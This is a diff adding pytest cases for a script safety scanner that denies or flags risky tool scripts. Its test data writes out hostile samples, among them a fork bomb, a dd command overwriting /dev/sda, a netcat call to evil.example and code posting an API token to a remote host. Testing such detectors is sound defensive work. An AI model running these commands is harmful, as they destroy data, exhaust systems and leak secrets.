@@ -344,6 +344,174 @@ def test_adversarial_write_and_sensitive_data_rules(content, language, rule_id):
     assert rule_id in report.rule_ids
 
 
+@pytest.mark.parametrize(
+    ("content", "language", "decision", "rule_id"),
+    [
+        (
+            "import os\nos.fork()",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.DENY,
+            "RESOURCE_PROCESS_FORK",
+        ),
+        (
+            "import asyncio\nasyncio.gather(work())",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "RESOURCE_CONCURRENCY",
+        ),
+        (
+            "eval(source)",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.DENY,
+            "PROCESS_DYNAMIC_CODE",
+        ),
+        (
+            "import time\ntime.sleep(delay)",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "RESOURCE_LONG_SLEEP",
+        ),
+        (
+            "import subprocess\nsubprocess.run('pip install demo')",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "DEPENDENCY_INSTALL",
+        ),
+        (
+            "from pathlib import Path\nPath('/usr/bin/tool').open('w')",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.DENY,
+            "FILE_SYSTEM_WRITE",
+        ),
+        (
+            "from pathlib import Path\npath.read_text()",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "FILE_DYNAMIC_PATH",
+        ),
+        (
+            "import socket\nsocket.connect(('evil.example', 443))",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.DENY,
+            "NETWORK_DOMAIN_NOT_ALLOWED",
+        ),
+        (
+            "import subprocess\nsubprocess.run(['echo', dynamic_argument])",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "PROCESS_SUBPROCESS",
+        ),
+        (
+            "open('large.bin', 'wb').write(10485761 * b'x')",
+            ScriptLanguage.PYTHON,
+            SafetyDecision.DENY,
+            "RESOURCE_LARGE_FILE_WRITE",
+        ),
+        (
+            ":(){ :|:& };:",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "RESOURCE_FORK_BOMB",
+        ),
+        (
+            "while true; do echo ok; done",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "RESOURCE_INFINITE_LOOP",
+        ),
+        (
+            "bash -c \"$COMMAND\"",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "PROCESS_SHELL_BYPASS",
+        ),
+        (
+            "echo ok &",
+            ScriptLanguage.BASH,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "PROCESS_BACKGROUND",
+        ),
+        (
+            "echo \"$API_TOKEN\"",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "SENSITIVE_OUTPUT",
+        ),
+        (
+            "curl \"$TARGET\"",
+            ScriptLanguage.BASH,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "NETWORK_DYNAMIC_TARGET",
+        ),
+        (
+            "sleep forever",
+            ScriptLanguage.BASH,
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "RESOURCE_LONG_SLEEP",
+        ),
+        (
+            "find /tmp -delete",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "FILE_DESTRUCTIVE_OPERATION",
+        ),
+        (
+            "dd if=/dev/zero of=/dev/sda bs=1M count=20",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "FILE_DEVICE_OVERWRITE",
+        ),
+        (
+            "nc evil.example 443",
+            ScriptLanguage.BASH,
+            SafetyDecision.DENY,
+            "NETWORK_DOMAIN_NOT_ALLOWED",
+        ),
+    ],
+)
+def test_high_risk_rule_matrix_covers_security_boundaries(content, language, decision, rule_id):
+    report = ToolScriptSafetyScanner().scan(_request(content, language))
+
+    assert report.decision == decision
+    assert rule_id in report.rule_ids
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        ("import os, requests\n"
+         "token: str = os.environ['API_TOKEN']\n"
+         "requests.post('https://api.example.com', data=token)"),
+        ("import os, requests\n"
+         "if token := os.environ['API_TOKEN']:\n"
+         "    requests.post('https://api.example.com', data=token)"),
+    ],
+)
+def test_python_secret_taint_propagates_through_assignment_expressions(content):
+    scanner = ToolScriptSafetyScanner(ToolSafetyPolicy(allowed_domains=["api.example.com"]))
+
+    report = scanner.scan(_request(content, ScriptLanguage.PYTHON))
+
+    assert report.decision == SafetyDecision.DENY
+    assert "SENSITIVE_EXFILTRATION" in report.rule_ids
+
+
+def test_context_rejects_sensitive_working_directory():
+    report = ToolScriptSafetyScanner().scan(_request("echo safe", ScriptLanguage.BASH, cwd="~/.ssh"))
+
+    assert report.decision == SafetyDecision.DENY
+    assert "FILE_FORBIDDEN_CWD" in report.rule_ids
+
+
+def test_script_over_configured_line_limit_is_denied():
+    scanner = ToolScriptSafetyScanner(ToolSafetyPolicy(max_script_lines=2))
+
+    report = scanner.scan(_request("first = 1\nsecond = 2\nthird = 3", ScriptLanguage.PYTHON))
+
+    assert report.decision == SafetyDecision.DENY
+    assert "RESOURCE_SCRIPT_TOO_LARGE" in report.rule_ids
+
+
 def test_command_arguments_are_scanned_as_part_of_the_command():
     request = ScriptScanRequest(
         payloads=[
